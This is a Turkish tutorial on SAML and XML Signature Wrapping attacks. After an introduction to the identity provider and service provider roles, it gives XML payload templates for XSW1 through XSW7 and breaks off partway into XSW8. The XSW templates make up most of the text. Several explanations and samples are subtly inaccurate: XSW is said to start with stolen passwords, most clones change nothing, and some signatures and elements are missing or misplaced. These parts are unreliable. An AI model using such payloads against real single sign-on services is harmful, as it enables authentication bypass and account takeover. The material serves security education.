# SAML Vulnerabilities

İlk olarak söylemem gereken şey çok detaylı ve uzun bir konu olduğundan dolayı sabırla okumanız. Cidden uzun olduğunu bende biliyorum. Fakat hala daha bazı sistemlerde kullanıldığından anlamanız sizi olumlu yönde etkiler ve yeni başlayan biriyseniz gözünüzde büyüyebilir. Pes etmeden birkaç saat çalışırsanız başaracağınıza ve konuyu anlayacağınıza eminim. Büyük ihtimalle bu güvenlik açıklarını deneyebileceğiniz bir simülasyon oluşturmuş olurum. O kısımdan simülasyonlarla eğitiminizi pekiştirebilirsiniz. Hiçbir şey anlamamaya başladıysanız gidin bir çay kahve demleyip geri gelip devam edin. Bence bir günde bitirilemeyecek bir konu olsa da Harsh Bothra abimiz bunun için 1 gün ayırmış. Üzgünüm :( iyi çalışmalar

Not: Bu günde olan uygulamalar için gerekli olacak simulasyonları gelecekte daha boş bir günde tasarlamayı planlamaktayım. İçeriği 8 saatte yazmayı başardım. Şimdi gidip içeriğe daha çok çalışmalıyım. Bu arada daha öncesinde bu konu hakkında bilginiz yoksa ileriki günlere de uzatarak çalışmanızı tavsiye ediyorum. Yine 365 gün sürecek fakat önümüzdeki günlerdeki içerikler bugün öğreneceğiniz bu içeriğe göre hem daha az hemde daha kolay diyebilirim. 

## SAML nedir?

İlk olarak bugün öğrenmemiz gereken şey SAML'ın ne olduğu. SAML kimlik doğrulama ve yetkilendirme için kullanılan XML tabanlı bir standarttır. SAML protokol olarak düzgün bir şekilde yapılandırıldığında güvenli bir şekilde kimlik bilgilerini paylaşmanızı sağlar ve birçok tek oturum açma (SSO) uygulamasında yaygın olarak kullanılır. Bu, kullanıcının birden çok web uygulamasında ayrı ayrı oturum açmasını engeller ve kullanıcı deneyimini iyileştirir.

SAML protokolü üç temel bileşenden oluşur:

- Kimlik Sağlayıcı (Identity Provider - IdP): Kimlik sağlayıcı, kullanıcıları doğrular ve kimlik bilgilerini sağlar. Kullanıcının kimlik doğrulaması tamamlandığında, bir SAML kimlik beyanı (assertion) oluşturur. Bu kimlik beyanı, kullanıcının yetkilendirilmiş olduğunu ve belirli bir hizmet sağlayıcıya erişim hakkı olduğunu doğrular.
- Hizmet Sağlayıcı (Service Provider - SP): Hizmet sağlayıcı, kullanıcının erişmek istediği hizmeti sunan web uygulaması veya kaynak sunucusudur. Hizmet sağlayıcı, kullanıcının SAML kimlik beyanını kabul eder, kimlik bilgilerini doğrular ve kullanıcıya erişim izni sağlar.
- Kullanıcı (User): Kullanıcı, SAML protokolünü kullanan web uygulamalarına erişmek isteyen kişidir. Kullanıcı, kimlik doğrulama işlemi için kimlik sağlayıcıya yönlendirilir ve kimlik doğrulaması tamamlandığında hizmet sağlayıcıya yönlendirilir.

SAML protokolü, kimlik doğrulama ve yetkilendirme işlemlerinin güvenli bir şekilde gerçekleştirilmesini sağlamak için çeşitli güvenlik mekanizmalarını kullanır. Bunlar arasında kimlik bilgilerinin şifrelenmesi, kimlik beyanlarının imzalanması ve güvenli iletişim kanallarının kullanılması gibi önlemler bulunur.

SAML, kurumsal uygulamalarda, bulut hizmetlerinde ve farklı organizasyonların sistemlerinin entegrasyonunda yaygın olarak kullanılan bir protokoldür. Tek oturum açma sağlaması ve güvenli kimlik doğrulama mekanizmalarıyla kullanıcı deneyimini ve güvenliği artırır.

fakat bazı durumlarda SAML hatalı bir şekilde yapılandırılır ve bunun sonucunda kritik güvenlik açıkları oluşur bugün bu açıkları işleyeceğiz.

## SAML Güvenlik açıklarına yakından bakalım

SAML yüzünden ortaya çıkan yaygın güvenlik açıklarına yakından bakacağız ve işleyişleri hakkında bilgi sahibi olacağız.

### Signature Wrapping (XSW) saldırıları 

Signature Wrapping (XSW) saldırıları, SAML protokolündeki bir güvenlik açığına dayanır. Bu saldırılar, kimlik sağlayıcı (Identity Provider - IdP) ve hizmet sağlayıcı (Service Provider - SP) arasındaki güveni sağlamak için kullanılan XML Dijital İmza (XML DSig) doğrulamasının yapılmaması durumunda gerçekleşir.

XSW saldırıları, saldırganın kimlik bilgilerini değiştirerek veya taklit ederek SAML kimlik beyanlarını (assertions) manipüle etmesini sağlar. Saldırgan, güvenilmeyen bir hizmet sağlayıcı olarak davranır ve hedeflenen SP'ye SAML kimlik beyanını iletir. Ancak, saldırgan SAML kimlik beyanını değiştirerek veya yeni kimlik beyanları ekleyerek SP'yi yanıltır.

Saldırı aşağıdaki adımları içerebilir:

- Saldırgan, kullanıcının kimlik bilgilerini (örneğin, kimlik sağlayıcıya giriş yapması için kullanılan kullanıcı adı ve parola) ele geçirir.

- Saldırgan, SAML kimlik beyanını oluşturur veya değiştirir. Kimlik beyanı, kullanıcının yetkilendirilmiş olduğunu ve belirli bir SP'ye erişim hakkı olduğunu doğrular.

- Saldırgan, SAML kimlik beyanını hedeflenen SP'ye gönderir. Kimlik beyanı, saldırganın yetkilendirilmiş bir kullanıcı olduğunu ve SP tarafından güvenilmesi gerektiğini ima eder.

- SP, SAML kimlik beyanını kabul eder ve içindeki kullanıcı bilgilerini doğrulamadan güvenli bir şekilde işler.

Saldırganın hedeflediği SP, SAML kimlik beyanının geçerli olduğunu varsayarak, saldırganın sahte kimlik beyanını kabul eder ve saldırganı yetkilendirir. Bu, saldırganın hedef SP'deki yetkileri kötüye kullanmasına ve örneğin ayrıcalık yükseltmesine, kimlik doğrulama istismarına veya hizmet reddine yol açabilir.

Bu saldırı tipleri 8'e ayrılır. Normalde okumanız için bir linke yönlendirebilirim fakat daha öncesinde bu konuyu çalışırken aklımı kaybediyordum. O yüzden sizlere çok daha detaylı ve ayrıntılı bir şekilde ben anlatmak istedim. 

- XSW1 ://  SAML Response mesajları için geçerlidir. Var olan imzanın hemen ardına, klonlanmış, imzasız bir Response kopyası eklenir.
```
<Response xmlns="urn:oasis:names:tc:SAML:2.0:protocol" ID="_d71c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z" Destination="https://service-provider.com/acs">
  <Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">https://identity-provider.com</Issuer>
  <Status xmlns="urn:oasis:names:tc:SAML:2.0:protocol">
    <StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </Status>
  <Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e44c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
    <Issuer>https://identity-provider.com</Issuer>
    <Subject>
      <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
      <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
      </SubjectConfirmation>
    </Subject>
    <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
      <AudienceRestriction>
        <Audience>https://service-provider.com</Audience>
      </AudienceRestriction>
    </Conditions>
    <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e44c9c3e8e9f6744e6e8d18d5f7fdd5a">
      <AuthnContext>
        <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
      </AuthnContext>
    </AuthnStatement>
    <Signature xmlns="http://www.w3.org/2000/09/xmldsig#">
      <!-- Orijinal Signature -->
    </Signature>
  </Assertion>
  <Response>
    <!-- Klonlanmış, imzasız Response kopyası -->
    <Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">https://identity-provider.com</Issuer>
    <Status xmlns="urn:oasis:names:tc:SAML:2.0:protocol">
      <StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </Status>
    <Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
      <Issuer>https://identity-provider.com</Issuer>
      <Subject>
        <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
        <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
          <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
        </SubjectConfirmation>
      </Subject>
      <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
        <AudienceRestriction>
          <Audience>https://service-provider.com</Audience>
        </AudienceRestriction>
      </Conditions>
      <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
        <AuthnContext>
          <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
        </AuthnContext>
      </AuthnStatement>
    </Assertion>
  </Response>
</Response>
```

Burada sizler için gerçek hayatta karşılaşabileceğiniz bir XML ekledim. Burada yaptığımız şey şu orjinal bir SAML Response isteğinin arkasına sahte bir istek daha ekliyoruz ve bunu yolluyoruz. Bu gönderdiğimiz alan eğer Service tarafından denetlenmiyorsa bizim SSO ile giriş yapmamıza izin veriyor.

- XSW2 :// SAML Response mesajları için geçerlidir. Yanıtın klonlanmış, imzasız bir kopyasını mevcut imzadan önce eklememiz gerekmektedir.

```
<Response xmlns="urn:oasis:names:tc:SAML:2.0:protocol" ID="_d71c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z" Destination="https://service-provider.com/acs">
  <Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">https://identity-provider.com</Issuer>
  <Status xmlns="urn:oasis:names:tc:SAML:2.0:protocol">
    <StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </Status>
  <Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
    <Issuer>https://identity-provider.com</Issuer>
    <Subject>
      <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
      <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
      </SubjectConfirmation>
    </Subject>
    <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
      <AudienceRestriction>
        <Audience>https://service-provider.com</Audience>
      </AudienceRestriction>
    </Conditions>
    <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
      <AuthnContext>
        <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
      </AuthnContext>
    </AuthnStatement>
  </Assertion>
  <!-- Klonlanmış, imzasız Response kopyası -->
  <Response>
    <Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">https://identity-provider.com</Issuer>
    <Status xmlns="urn:oasis:names:tc:SAML:2.0:protocol">
      <StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </Status>
    <Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
      <Issuer>https://identity-provider.com</Issuer>
      <Subject>
        <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
        <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
          <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
        </SubjectConfirmation>
      </Subject>
      <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
        <AudienceRestriction>
          <Audience>https://service-provider.com</Audience>
        </AudienceRestriction>
      </Conditions>
      <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b">
        <AuthnContext>
          <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
        </AuthnContext>
      </AuthnStatement>
    </Assertion>
  </Response>
</Response>
```
Yukarıdaki örnekte, orijinal Response içindeki tüm SAML öğeleri korunmuş ve klonlanmış bir Response kopyası imzasız olarak eklenmiştir. Hem orijinal hem de klonlanmış Response, aynı kimlik sağlayıcı tarafından üretilmiş Assertion'ları içermektedir. Burada yaptığımız imzasız bir response'u doğru response ve imzadan önce göndererek SP'den yetki almaya çalışıp SSO ile giriş yapabilmektir.

- XSW3 :// mevcut Assertion'ın önüne klonlanmış, imzasız bir Assertion kopyası eklenir. 

```
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
  <Issuer>https://identity-provider.com</Issuer>
  <Subject>
    <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
    <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
    </SubjectConfirmation>
  </Subject>
  <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
    <AudienceRestriction>
      <Audience>https://service-provider.com</Audience>
    </AudienceRestriction>
  </Conditions>
  <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
    <AuthnContext>
      <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
    </AuthnContext>
  </AuthnStatement>
</Assertion>
<!-- Klonlanmış, imzasız Assertion kopyası -->
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
  <Issuer>https://identity-provider.com</Issuer>
  <Subject>
    <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
    <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
    </SubjectConfirmation>
  </Subject>
  <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
    <AudienceRestriction>
      <Audience>https://service-provider.com</Audience>
    </AudienceRestriction>
  </Conditions>
  <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b">
    <AuthnContext>
      <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
    </AuthnContext>
  </AuthnStatement>
</Assertion>
```
XSW3 senaryosu, SAML Assertion mesajlarında gerçekleşir. Saldırgan, mevcut Assertion'ın önüne, klonlanmış ve imzasız bir Assertion kopyası ekler. Böylece, SAML mesajı birden fazla Assertion içerecek şekilde manipüle edilir.

- XSW4 :// mevcut Assertion içine, klonlanmış, imzasız bir Assertion kopyası eklenir.

```
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
  <Issuer>https://identity-provider.com</Issuer>
  <Subject>
    <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
    <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
    </SubjectConfirmation>
  </Subject>
  <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
    <AudienceRestriction>
      <Audience>https://service-provider.com</Audience>
    </AudienceRestriction>
  </Conditions>
  <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
    <AuthnContext>
      <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
    </AuthnContext>
  </AuthnStatement>
  <!-- Klonlanmış, imzasız Assertion kopyası -->
  <Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
    <Issuer>https://identity-provider.com</Issuer>
    <Subject>
      <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
      <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
      </SubjectConfirmation>
    </Subject>
    <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
      <AudienceRestriction>
        <Audience>https://service-provider.com</Audience>
      </AudienceRestriction>
    </Conditions>
    <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b">
      <AuthnContext>
        <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
      </AuthnContext>
    </AuthnStatement>
  </Assertion>
</Assertion>
```
XSW4 senaryosu, SAML Assertion mesajlarında gerçekleşir. Saldırgan, mevcut Assertion'ın içine, klonlanmış ve imzasız bir Assertion kopyası ekler. Böylece, mevcut Assertion içinde birden fazla Assertion bulunur ve saldırganın yetkileri genişletilir.

- XSW5 :// imzalı kopyada bulunan bir değeri değiştirir ve SAML mesajının sonuna, imzası kaldırılmış orijinal Assertion'ın bir kopyasını ekler.

```
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
  <Issuer>https://identity-provider.com</Issuer>
  <Subject>
    <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
    <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
    </SubjectConfirmation>
  </Subject>
  <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
    <AudienceRestriction>
      <Audience>https://service-provider.com</Audience>
    </AudienceRestriction>
  </Conditions>
  <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
    <AuthnContext>
      <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
    </AuthnContext>
  </AuthnStatement>
</Assertion>

<!-- XSW5 senaryosu için değiştirilmiş Assertion'ın kopyası -->
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
  <Issuer>https://identity-provider.com</Issuer>
  <Subject>
    <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
    <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
    </SubjectConfirmation>
  </Subject>
  <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
    <AudienceRestriction>
      <Audience>https://service-provider.com</Audience>
    </AudienceRestriction>
  </Conditions>
  <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b">
    <AuthnContext>
      <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
    </AuthnContext>
  </AuthnStatement>
</Assertion>

```
Yukarıdaki örnek SAML kodunda, orijinal Assertion'ın bir kopyası oluşturulur ve `_e55c9c3e8e9f6744e6e8d18d5f7fdd5b` olarak yeni bir ID atanır. Bu kopya Assertion'ın içeriği, imzalı Assertion'ın bir kısmıyla değiştirilir. Sonuç olarak, SAML mesajının sonunda orijinal Assertion ile imzasız bir kopya bulunur. Bu, saldırganın imzalı Assertion'ı geçersiz hale getirip değişiklik yapabilmesini sağlar.

- XSW6 :// imzalı Assertion'ın kopyasında bulunan bir değeri değiştirir ve imzanın hemen ardından imzası kaldırılmış orijinal Assertion'ın bir kopyasını ekler. saldırgan imzalı Assertion'ın kopyasında bulunan bir değeri değiştirir. Ardından, değiştirilmiş Assertion'ı içeren bir kopya oluşturur ve bu kopyayı imzanın hemen ardına ekler. Son olarak, imzası kaldırılmış orijinal Assertion'ın bir kopyasını oluşturur ve bu kopyayı SAML mesajına ekler. Bu sayede, orijinal Assertion geçerli gibi görünürken, saldırganın değiştirdiği değeri içeren imzalı Assertion'ı kabul eden hizmet sağlayıcıyı yanıltabilir.

```
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
  <Issuer>https://identity-provider.com</Issuer>
  <Subject>
    <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
    <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
    </SubjectConfirmation>
  </Subject>
  <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
    <AudienceRestriction>
      <Audience>https://service-provider.com</Audience>
    </AudienceRestriction>
  </Conditions>
  <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
    <AuthnContext>
      <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
    </AuthnContext>
  </AuthnStatement>
</Assertion>

<!-- XSW6 senaryosu için değiştirilmiş Assertion'ın kopyası -->
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
  <Issuer>https://identity-provider.com</Issuer>
  <Subject>
    <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
    <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
    </SubjectConfirmation>
  </Subject>
  <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
    <AudienceRestriction>
      <Audience>https://service-provider.com</Audience>
    </AudienceRestriction>
  </Conditions>
  <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b">
    <AuthnContext>
      <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
    </AuthnContext>
  </AuthnStatement>
</Assertion>

<!-- Orijinal Assertion'ın imzasız kopyası -->
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
  <Issuer>https://identity-provider.com</Issuer>
  <Subject>
    <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
    <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
    </SubjectConfirmation>
  </Subject>
  <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
    <AudienceRestriction>
      <Audience>https://service-provider.com</Audience>
    </AudienceRestriction>
  </Conditions>
  <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
    <AuthnContext>
      <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
    </AuthnContext>
  </AuthnStatement>
</Assertion>

```
Yukarıdaki örnekte, Assertion'ın kopyalarının `_e55c9c3e8e9f6744e6e8d18d5f7fdd5a` ve `_e55c9c3e8e9f6744e6e8d18d5f7fdd5b` ID değerleri ile ayırt edildiğini görebilirsiniz. Değiştirilmiş Assertion, ID değerinin yanı sıra diğer XML alanlarında da değişiklikler içerir. Saldırgan, bu değiştirilmiş Assertion'ı imzanın hemen ardına eklerken, orijinal Assertion'ı imzasız bir kopya olarak ekler. Böylece, hizmet sağlayıcı, imzalı Assertion'ı doğrulayacak olsa bile, değiştirilmiş Assertion'ı kabul eder ve saldırganın manipülasyonunu gerçekleştirir.

- XSW7 :// bir SAML Assertion mesajına klonlanmış, imzasız bir Assertion içeren bir "Extensions" bloğunun eklenmesiyle gerçekleştirilir. Bu şekilde, saldırgan kendi manipüle edilmiş Assertion'ını, orijinal Assertion ile birlikte SAML mesajına ekler.

```
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
  <Issuer>https://identity-provider.com</Issuer>
  <Subject>
    <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
    <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
    </SubjectConfirmation>
  </Subject>
  <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
    <AudienceRestriction>
      <Audience>https://service-provider.com</Audience>
    </AudienceRestriction>
  </Conditions>
  <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b">
    <AuthnContext>
      <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
    </AuthnContext>
  </AuthnStatement>
  <Extensions>
    <!-- Klonlanmış, imzasız Assertion -->
    <Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
      <Issuer>https://identity-provider.com</Issuer>
      <Subject>
        <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">eviluser@example.com</NameID>
        <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
          <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
        </SubjectConfirmation>
      </Subject>
      <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
        <AudienceRestriction>
          <Audience>https://service-provider.com</Audience>
        </AudienceRestriction>
      </Conditions>
      <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
        <AuthnContext>
          <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
        </AuthnContext>
      </AuthnStatement>
    </Assertion>
  </Extensions>
  <Signature>
    <!-- Signature bilgileri burada yer alır -->
  </Signature>
</Assertion>

```
Yukarıdaki örnekte, Extensions bloğu içine yerleştirilen klonlanmış Assertion (`_e55c9c3e8e9f6744e6e8d18d5f7fdd5a` ID değeri ile ayırt edilir) bulunmaktadır. Bu Assertion, saldırganın manipüle ettiği bilgileri ve istediği kimlik beyanını içerebilir. Hizmet sağlayıcı, Extensions bloğundaki Assertion'ı kabul eder ve saldırganın istediği yetkilendirme ve erişim haklarını verir.

- XSW8 :// orijinal imzası kaldırılmış bir kopya Assertion'ı içeren bir "Object" bloğunun eklenmesiyle gerçekleştirilir. Bu şekilde, saldırgan orijinal Assertion'ı manipüle etmeden doğrudan SAML mesajına ekleyebilir.

```
<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
  <Issuer>https://identity-provider.com</Issuer>
  <Subject>
    <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
    <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
      <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
    </SubjectConfirmation>
  </Subject>
  <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
    <AudienceRestriction>
